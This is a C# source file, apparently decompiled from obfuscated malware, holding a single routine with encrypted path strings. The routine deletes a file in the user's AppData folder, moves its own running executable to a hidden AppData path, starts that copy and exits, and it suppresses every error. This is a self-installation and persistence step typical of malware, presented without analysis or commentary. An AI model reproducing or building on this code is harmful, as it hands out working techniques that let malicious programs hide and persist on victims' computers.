using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal class Class8
{
	public class Class9
	{
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetModuleFileNameA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int ExitProcess(uint uint_0);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string string_0, [In][MarshalAs(UnmanagedType.LPTStr)] string string_1, long long_0);

		public static void smethod_0()
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("foqxsrORsLe1tX6Usb2WkqGpw6aUa63HpiQ=", "False")))
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("fYmwsbKQr7a0tH2TsLyVkaCowqWTaqzGpSU=", "False"));
				}
				string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
				string string_ = Process.GetCurrentProcess().MainModule!.FileName;
				MoveFileExW(Strings.Left(fileName, GetModuleFileNameA(0, ref string_, 256)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("oKzT1NWz0tnX16C209+4tMPL5ci2jc/pyAI=", "False"), 8L);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("c3+mp6iGpayqqnOJprKLh5aeuJuJYKK8my8=", "False"));
				ExitProcess(0u);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
